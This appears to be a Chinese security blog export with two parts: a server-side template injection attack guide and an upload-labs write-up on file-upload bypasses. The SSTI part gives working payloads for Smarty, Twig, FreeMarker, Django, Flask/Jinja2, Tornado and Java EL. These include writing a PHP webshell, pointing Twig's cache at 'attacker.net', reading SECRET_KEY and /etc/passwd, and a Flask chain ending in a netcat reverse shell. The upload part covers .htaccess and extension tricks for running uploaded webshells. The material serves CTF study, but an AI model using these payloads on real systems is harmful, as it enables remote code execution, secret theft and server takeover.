<h1 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h1><p>这里提供一个大牛写的 SSTI 的检测工具 <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a><br>或者64验证是否会被运算输出</p>
<h1 id="攻击方向"><a href="#攻击方向" class="headerlink" title="攻击方向"></a>攻击方向</h1><h2 id="0X06-攻击思路"><a href="#0X06-攻击思路" class="headerlink" title="0X06 攻击思路"></a><strong>0X06 攻击思路</strong></h2><h3 id="1-攻击方向："><a href="#1-攻击方向：" class="headerlink" title="1.攻击方向："></a><strong>1.攻击方向：</strong></h3><p>找到模板注入主要从三个方向进行攻击</p>
<p>(1)模板本身<br>(2)框架本身<br>(3)语言本身<br>(4)应用本身</p>
<h3 id="2-攻击方法："><a href="#2-攻击方法：" class="headerlink" title="2.攻击方法："></a><strong>2.攻击方法：</strong></h3><p>我们知道 SSTI 能够造成很多种危害，包括 敏感信息泄露、RCE、GetShell 等，关键就在于如何才能利用这个注入点执行我们想执行的代码，那么我们寻找利用点的范围实际上就是在我们上面的四个地方，一个是模板本身支持的语法、内置变量、属性、函数，还有就是纯粹框架的全局变量、属性、函数，然后我们考虑语言本身的特性，比如 面向对象的内省机制，最最最后我们无能为力的时候才考虑怎么寻找应用定义的一些东西，因为这个是几乎没有文档的，是开发者的自行设计，一般需要拿到应用的源码才能考虑，于是我将其放在最后一个</p>
<blockquote>
<p><strong>注意：</strong></p>
<p>在这种面向对象的语言中，获取父类这种思想要贯穿始终，理论基础就是 Python 的魔法方法 PHP 的自省 JAVA 的反射 机制</p>
</blockquote>
<h4 id="1-利用模板本身的特性进行攻击"><a href="#1-利用模板本身的特性进行攻击" class="headerlink" title="1.利用模板本身的特性进行攻击"></a><strong>1.利用模板本身的特性进行攻击</strong></h4><h5 id="1-Smarty"><a href="#1-Smarty" class="headerlink" title="1.Smarty"></a><strong>1.Smarty</strong></h5><p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)</p>
<p>但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读模板的文档以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的好用的方法</p>
<p>比如：<a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L385">getStreamVariable()</a></p>
<p>github 中明确指出，这个方法可以获取传入变量的流（说人话就是读文件）</p>
<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;loginuid&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>再比如：<a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16">class Smarty_Internal_Write_File</a></p>
<p>有了上面的读文件当然要找一个写文件的了，这个类中有一个writeFile方法</p>
<p><strong>函数原型：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function writeFile($_filepath, $_contents, Smarty $smarty)</span><br></pre></td></tr></table></figure>

<p>但是这个第三个参数是一个 Smarty 类型，后来找到了 <code>self::clearConfig()</code></p>
<p><strong>函数原型：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function clearConfig($varname &#x3D; null)</span><br><span class="line">&#123;</span><br><span class="line">    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>能写文件对攻击者真的是太有利了，一般不出意外能直接 getshell</p>
<p><strong>payload：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-Twig"><a href="#2-Twig" class="headerlink" title="2.Twig"></a><strong>2.Twig</strong></h5><p>相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，也就是我们不能使用 <code>self::</code> 调用静态变量了，但是 通过<a href="https://twig.symfony.com/doc/2.x/templates.html">官方文档</a>的查询</p>
<p><strong>如下图所示：</strong></p>
<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_self.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_self.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
<p>Twig 给我们提供了一个 <code>_self</code>, 虽然 <code>_self</code> 本身没有什么有用的方法，但是却有一个 env</p>
<p><strong>如下图所示：</strong></p>
<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_env.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_env.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
<p>env是指属性Twig_Environment对象，Twig_Environment对象有一个 setCache方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置(不知道为什么官方文档没有看到这个方法，后来我找到了Twig 的源码中的 environment.php</p>
<p><strong>如下图所示：</strong></p>
<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_setCache.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_setCache.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
<p>因此，明显的攻击是通过将缓存位置设置为远程服务器来引入远程文件包含漏洞：</p>
<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.setCache(&quot;ftp:&#x2F;&#x2F;attacker.net:2121&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>但是新的问题出现了</strong>，allow_url_include 一般是不打开的，没法包含远程文件，没关系还有个调用过滤器的函数 <a href="https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874">getFilter()</a></p>
<p>这个函数中调用了一个 call_user_function 方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function getFilter($name)</span><br><span class="line">&#123;</span><br><span class="line">        [snip]</span><br><span class="line">        foreach ($this-&gt;filterCallbacks as $callback) &#123;</span><br><span class="line">        if (false !&#x3D;&#x3D; $filter &#x3D; call_user_func($callback, $name)) &#123;&#x2F;&#x2F;注意这行</span><br><span class="line">            return $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function registerUndefinedFilterCallback($callable)</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;filterCallbacks[] &#x3D; $callable;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>我们只要把exec() 作为回调函数传进去就能实现命令执行了</p>
<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3-freeMarker"><a href="#3-freeMarker" class="headerlink" title="3.freeMarker"></a><strong>3.freeMarker</strong></h5><p>这个模板主要用于 java ，在上面我举例 java 的 SSTI 的时候我已经简答的分析过这个的一个 payload，我希望读者也能按照 查找文档，查看框架源码，等方式寻找这个 payload 的思路来源</p>
<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-利用框架本身的特性进行攻击"><a href="#2-利用框架本身的特性进行攻击" class="headerlink" title="2.利用框架本身的特性进行攻击"></a><strong>2.利用框架本身的特性进行攻击</strong></h4><p>因为这里面的摸吧模板似乎都是内置于框架内的，于是我就将其放在利用框架这一节</p>
<h5 id="1-Django"><a href="#1-Django" class="headerlink" title="1.Django"></a><strong>1.Django</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def view(request, *args, **kwargs):</span><br><span class="line">    template &#x3D; &#39;Hello &#123;user&#125;, This is your email: &#39; + request.GET.get(&#39;email&#39;)</span><br><span class="line">    return HttpResponse(template.format(user&#x3D;request.user))</span><br></pre></td></tr></table></figure>

<p>注入点很明显就是 email，但是如果我们的能力已经被限制的很死，很难执行命令，但又想获取和 User 有关的配置信息的话，我么怎么办？</p>
<p>可以发现我们现在拿到的只有有一个 和user 有关的变量，那就是 request user ，那我们的思路是什么？</p>
<p>p牛在自己的博客中分享了这个思路，我把它引用过来：</p>
<blockquote>
<p>Django是一个庞大的框架，其数据库关系错综复杂，我们其实是可以通过属性之间的关系去一点点挖掘敏感信息。但Django仅仅是一个框架，在没有目标源码的情况下很难去挖掘信息，所以我的思路就是：去挖掘Django自带的应用中的一些路径，最终读取到Django的配置项</p>
</blockquote>
<p>什么意思，简单地说就是我们在没有应用源码的情况下要学会去寻找框架本身的属性，看这个空框架有什么属性和类之间的引用，然后一步一步的靠近我们的目标</p>
<p>后来我们发现，经过翻找，我发现Django自带的应用“admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件：</p>
<p><strong>如下图：</strong></p>
<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/django-seetings.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/django-seetings.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
<p>所以，思路就很明确了：我们只需要通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p>
<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;?email&#x3D;&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;?email&#x3D;&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-Flask-Jinja2"><a href="#2-Flask-Jinja2" class="headerlink" title="2.Flask/Jinja2"></a><strong>2.Flask/Jinja2</strong></h5><p>config 是Flask模版中的一个全局对象，它代表“当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。虽然config是一个类字典对象，但是通过查阅文档可以发现 config 有很多神奇的方法：from_envvar, from_object, from_pyfile, 以及root_path。</p>
<p><strong>如图所示：</strong></p>
<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/flask-config.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/flask-config.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
<p>这里我们利用 from_pyfile 和 from_object 来命令执行，下面是这两个函数的源代码（为了阅读清晰，注释我删除了）</p>
<p><strong>源码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def from_pyfile(self, filename, silent&#x3D;False):</span><br><span class="line"></span><br><span class="line">    filename &#x3D; os.path.join(self.root_path, filename)</span><br><span class="line">    d &#x3D; types.ModuleType(&#39;config&#39;)</span><br><span class="line">    d.__file__ &#x3D; filename</span><br><span class="line">    try:</span><br><span class="line">        with open(filename) as config_file:</span><br><span class="line">            exec(compile(config_file.read(), filename, &#39;exec&#39;), d.__dict__)</span><br><span class="line">    except IOError as e:</span><br><span class="line">        if silent and e.errno in (errno.ENOENT, errno.EISDIR):</span><br><span class="line">            return False</span><br><span class="line">        e.strerror &#x3D; &#39;Unable to load configuration file (%s)&#39; % e.strerror</span><br><span class="line">        raise</span><br><span class="line">    self.from_object(d)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def from_object(self, obj):</span><br><span class="line"></span><br><span class="line">    if isinstance(obj, string_types):</span><br><span class="line">        obj &#x3D; import_string(obj)</span><br><span class="line">    for key in dir(obj):</span><br><span class="line">        if key.isupper():</span><br><span class="line">            self[key] &#x3D; getattr(obj, key)</span><br></pre></td></tr></table></figure>

<p><strong>简单的解释一下这个方法：</strong></p>
<p>这个方法将传入的文件使用 compile() 这个python 的内置方法将其编译成字节码(.pyc),并放到 exec() 里面去执行，注意最后一个参数 <code>d.__dict__</code>翻阅文档发现，这个参数的含义是指定 exec 执行的上下文，</p>
<p><strong>如图所示：</strong></p>
<p>[![此处输入图片的描述](<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Python">https://picture-1253331270.cos.ap-beijing.myqcloud.com/Python</a> exec.png)](<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Python">https://picture-1253331270.cos.ap-beijing.myqcloud.com/Python</a> exec.png)此处输入图片的描述</p>
<p>我们简单的模拟一下看一下效果</p>
<p><strong>如图所示:</strong></p>
<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/d.__dict__.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/d.__dict__.png" alt="此处输入图片的描述"></a>此处输入图片的描述<br><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/d.__dict__2.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/d.__dict__2.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
<p>执行的代码片段被放入了 <code>d.__dict__</code> 中,这看似没设么用，但是神奇的是后面他调用了 from_object() 方法，根据源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for key in dir(obj):</span><br><span class="line">           if key.isupper():</span><br><span class="line">               self[key] &#x3D; getattr(obj, key)</span><br></pre></td></tr></table></figure>

<p>这个方法会遍历 Obj 的 dict 并且找到大写字母的属性，将属性的值给 self[‘属性名’]，所以说如果我们能让 from_pyfile 去读这样的一个文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from os import system</span><br><span class="line">SHELL &#x3D; system</span><br></pre></td></tr></table></figure>

<p>到时候我们就能通过 config[‘SHELL’] 调用 system 方法了</p>
<p>那么文件怎么写入呢？Jinja2 有沙盒机制，我们必须通过绕过沙盒的方式写入我们想要的文件，具体的沙盒绕过可以参考我的一篇博文[python 沙盒逃逸备忘](<a href="http://www.k0rz3n.com/2018/05/04/Python">http://www.k0rz3n.com/2018/05/04/Python</a> 沙盒逃逸备忘/)</p>
<p><strong>最终的 payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;evil&#39;, &#39;w&#39;).write(&#39;from os import system%0aSHELL &#x3D; system&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;写文件</span><br><span class="line">&#123;&#123; config.from_pyfile(&#39;&#x2F;tmp&#x2F;evil&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;加载system</span><br><span class="line">&#123;&#123; config[&#39;SHELL&#39;](&#39;nc xxxx xx -e &#x2F;bin&#x2F;sh&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;执行命令反弹SHELL</span><br></pre></td></tr></table></figure>

<h5 id="3-Tornado"><a href="#3-Tornado" class="headerlink" title="3.Tornado"></a><strong>3.Tornado</strong></h5><p>写文章的时候正巧赶上护网杯出了一道 tornado 的 SSTI 于是这里也作为一个比较好的例子给大家说明</p>
<p>根据提示这道题的意思就是通过SSTI 获取 cookie_secret，但是这里过滤了很多东西</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;%&#39;()*-&#x2F;&#x3D;[\]_|</span><br></pre></td></tr></table></figure>

<p>甚至把_(下划线)都过滤了，也就是说我们没法通过Python 的魔法方法进行沙盒逃逸执行命令，并且实际上对我们的寻找合适的 tornado 的内置的方法也有很多的限制。</p>
<p>我觉得除了直接阅读官方的文档，还有一个重要的方法就是直接下载 tornado 的框架源码，全局搜索 cookie_secret</p>
<p><strong>如下图：</strong></p>
<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/cookie_secret.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/cookie_secret.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
<p>你会发现 cookie_secret 是handler.application.settings 的键值，那我们只要获取到这个对象是不是就可以了，没错，那么 handler 是什么，看<a href="http://www.tornadoweb.org/en/stable/guide/templates.html#template-syntax">官方文档</a>，我特地看一下模板的对框架的语法支持(因为，模板中有一些内置的对象等同于框架中的对象，但是一般为了方便书写前段就会给一个比较简单的名字，就比如 JSP 的 request 内置对象实际上对应着 servlet 中的 HttpServletRequest )</p>
<p><strong>如下图所示：</strong></p>
<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/handler.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/handler.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
<p>这里明确写着 handler 对应的就是 RequestHandler,那么也就是说，我们可以使用 handler 调用 RequestHandler 的方法，我们还是看<a href="https://www.tornadoweb.org/en/stable/web.html?highlight=RequestHandler">官方文档</a></p>
<p><strong>如下图所示：</strong></p>
<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/handler_settings.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/handler_settings.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
<p>很清楚，我么看到 RequestHandler.settings 是 self.application.settings 的别名，等等！ 有没有觉得有些似曾相识？对啊，这不就是我们之前在框架源码中找到的那个东西吗，也就是说我们能直接通过 handler.settings 访问到 我们朝思暮想的 cookie_secret ，至此我的分析就结束了。</p>
<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;117.78.26.79:31093&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-利用模语言本身的特性进行攻击"><a href="#2-利用模语言本身的特性进行攻击" class="headerlink" title="2.利用模语言本身的特性进行攻击"></a><strong>2.利用模语言本身的特性进行攻击</strong></h4><h5 id="1-Python"><a href="#1-Python" class="headerlink" title="1.Python"></a><strong>1.Python</strong></h5><p>Python 最最经典的就是使用魔法方法，这里就涉及到Python沙盒绕过了，前面说过，模板的设计者也发现了模板的执行命令的特性，于是就给模本增加了一种沙盒的机制，在这个沙盒中你很难执行一般我们能想到函数，基本都被禁用了，所以我们不得不使用自省的机制来绕过沙盒，具体的方法就是在我的[一篇博文](<a href="http://www.k0rz3n.com/2018/05/04/Python">http://www.k0rz3n.com/2018/05/04/Python</a> 沙盒逃逸备忘/)中</p>
<h5 id="2-JAVA"><a href="#2-JAVA" class="headerlink" title="2.JAVA"></a><strong>2.JAVA</strong></h5><p>java.lang包是java语言的核心，它提供了java中的基础类。包括基本Object类、Class类、String类、基本类型的包装类、基本的数学类等等最基本的类</p>
<p><strong>如下图所示：</strong></p>
<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/java.lang.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/java.lang.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
<p>有了这个基础我们就能想到这样的payload</p>
<p><strong>payload：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;T(java.lang.System).getenv()&#125;</span><br><span class="line"></span><br><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(&#39;cat etc&#x2F;passwd&#39;)&#125;</span><br></pre></td></tr></table></figure>

<p>当然要是文件操作就要用另外的类了,思路是不变的</p>
<p><strong>payload：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意:</strong></p>
<p>这里面的 T() 是 EL 的语法规定（比如 Spring 框架的 EL 就是 SPEL)</p>
</blockquote>
<p>参考:<a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#0X06-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#0X06-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF</a></p>
]]></content>
  </entry>
  <entry>
    <title>upload-labs1</title>
    <url>/2020/12/17/upload-labs1/</url>
    <content><![CDATA[<h1 id="文件上传漏洞原理"><a href="#文件上传漏洞原理" class="headerlink" title="文件上传漏洞原理"></a>文件上传漏洞原理</h1><h4 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h4><p>1.服务器配置不当会导致任意文件上传<br>2.web应用开放了文件上传的功能，并对上传的文件没有进行足够的限制和过滤<br>3.web应用开放了文件上传功能，虽然在开发时加入了一定的过滤功能，但并不严格，可以被绕过<br>4.上传文件时如果服务端代码未对客户端上传的文件进行严格的验证和过滤，就容易造成可以上传任意文件的情况，包括上传脚本文件（asp、aspx、php、jsp等格式的文件）。<br><a href="https://blog.csdn.net/qq_36119192/article/details/84593150">https://blog.csdn.net/qq_36119192/article/details/84593150</a><br>上面这个是关于那几个后缀的文件的说明                            <a id="more"></a></p>
<h4 id="产生条件"><a href="#产生条件" class="headerlink" title="产生条件"></a>产生条件</h4><p>1.web服务器要开启文件上传功能，并且上传API（接口）对外开放，即web用户可以访问；<br>2.web用户对目标目录具有可写权限，甚至具有执行权限，一般情况下，web目录都具有执行权限；<br>3.我们上传的文件在服务器的系统环境里能够正常运行，即web容器能够解析我们上传的脚本，不论脚本以什么样的形式存在。</p>
<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>恶意的脚本文件，又被称为webshell，webshell脚本称为一种网页后门，webshell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件、执行系统命令等<br><strong>导图</strong></p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210105224221.png" alt="img"><br><a href="https://xz.aliyun.com/t/2435?spm=5176.12901015.0.i12901015.74b5525csqU5p2">https://xz.aliyun.com/t/2435?spm=5176.12901015.0.i12901015.74b5525csqU5p2</a></p>
<h2 id="upload-labs1"><a href="#upload-labs1" class="headerlink" title="upload-labs1"></a>upload-labs1</h2><p>步骤其实很简单，之前在学一句话木马的时候已经有学习过了<br>流程是：在txt文本中写下一句话代码——&gt;将后缀改为jpg等图片格式的后缀——&gt;然后上传，在上传的时候抓包，在burp里面将后缀修改为php，使其在后面能够被运行——&gt;然后利用蚁剑等工具连接一句话木马即可。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201219214436.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201219214607.png" alt="img"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201219214709.png" alt="img"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201219215012.png" alt="img" style="zoom:50%;">
将后缀改为php 并发送 然后在蚁剑中连接
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201219215148.png" alt="img" style="zoom:67%;">

<p>好了 成功了<br>以上为方法一，我们可以在burp中修改后缀，从而达到注入的效果<br>这里就简述一下吧，因为之前打过一遍了忘记保存印象还挺深刻的：<br>方法二：<br>我们在index.php看到一个chekfile的过滤函数，然后再show_code里面看到一个JavaScript写的网页代码，我们可以知道，PHP中的代码在JavaScript中发挥作用，而在审查元素中我们可以看到JavaScript的函数调用<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201224183709.png" alt="img" style="zoom:67%;"><br>当我们把他删除掉后，也就不存在过滤这一说，直接上传即可了<br>方法三，直接禁用JavaScript函数调用<br>思考：PHP，JavaScript的联动操作</p>
<h2 id="upload-labs2"><a href="#upload-labs2" class="headerlink" title="upload-labs2"></a>upload-labs2</h2><p>第二关提示中说对MIME进行检查<br><strong>什么是MIME？</strong>使用MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准，使用MIME类型可以设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</p>
<p>在JSP页面中，contentType属性设置为：contentType=“text/html;charset=GBK”。</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201224174432.png" alt="img" style="zoom:67%;">

<p>所以这里有两种方法：<br><strong>1.**：我们还是上传jpg然后抓包更改后缀为php，因为这个时候MIME-Type已经变为image/jpeg避开过滤了<br>**2.**我们也可直接修改MIME-Type中的类型，将其修改为image/jpeg<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201224180855.png" alt="img"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201224181619.png" alt="img" style="zoom:67%;"><br>依旧是可以成功的<br>接着看一下源代码<br>**move_uploaded_file()函数</strong><br>将上传的文件移动到新的位置<br>语法：<br>move_uploaded_file(file,newloc)</p>
<table>
<thead>
<tr>
<th>file</th>
<th>必需。规定要移动的文件。</th>
</tr>
</thead>
<tbody><tr>
<td>newloc</td>
<td>必需。规定文件的新位置。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>newloc</th>
<th>必需。规定文件的新位置。</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="move-uploaded-file-函数漏洞"><a href="#move-uploaded-file-函数漏洞" class="headerlink" title="move_uploaded_file()函数漏洞"></a>move_uploaded_file()函数漏洞</h4><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201224171842.png" alt="img" style="zoom:67%;">

<h3 id="upload-labs3"><a href="#upload-labs3" class="headerlink" title="upload-labs3"></a>upload-labs3</h3><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><p><strong>基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功。</strong><br>从这里开始 我们就进入了黑名单的关卡：<br>看看代码吧<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201231010952.png" alt="img" style="zoom:67%;"><br>因为已经写过一遍我就大概说一下：<br>他是定义一组后缀名，然后对于传输过去的文件，经过删除文件名末尾的点，从文件的点开始向后截取，<br>以及将文件名全部转化成小写，最后移除旁边的空格。<br>其中strrchr()函数的作用就是搜素并窃取搜索点及以后的位置<br>他禁用了挺多的类型的后缀的但是，我们还可以使用其他后缀进行绕过<br><strong>phtml,php3,php4,php5,pht</strong></p>
<h2 id="upload-labs-4"><a href="#upload-labs-4" class="headerlink" title="upload-labs 4"></a>upload-labs 4</h2><p>在这一关中 将很多php的拓展形式都过滤了<br>这个时候我们需要引进一个.htaccess文件<br><strong>作用</strong>：<br>htaccess文件时Apache服务器中的一个配置文件，负责相关目录下网页配置，可以帮我们实现网页301重定向，自定义404错误页面，改变文件扩展名等功能，其中.htaccess文件内容:<strong>SetHandler application/x-httpd-php</strong>设置当前目录所有文件都使用PHP解析，无论上传任何文件，只要符合php语言代码规范，就会被当做php文件执行。<br><a href="https://blog.csdn.net/cmzhuang/article/details/53537591%EF%BC%88%E6%B7%B1%E5%B1%82%E7%90%86%E8%A7%A3%E5%8D%9A%E5%AE%A2%EF%BC%89">https://blog.csdn.net/cmzhuang/article/details/53537591（深层理解博客）</a></p>
<p><strong>上传.htaccess文件</strong><br>文件内容如下：<br>SetHandler application/x-httpd-php<br><strong>PS：</strong>这里需要将上传的文件不用前缀 即.htaccess<br>指定文件进行php的转化：<br>在写入.htaccess的时候，我们可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shuaige&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>写出这段代码，注意到开头”shuaige”意为含有文件内含有shuaige的文件都会被解析为php文件<br>这里要使用这个.htaccess要记得去apache里面配置一下</p>
<h2 id="upload-labs5"><a href="#upload-labs5" class="headerlink" title="upload-labs5"></a>upload-labs5</h2><p>在这关当中，我们注意到，他过滤空格和.只过滤了一次，所以我们可以通过构建123.php. .的形式进行绕过过滤</p>
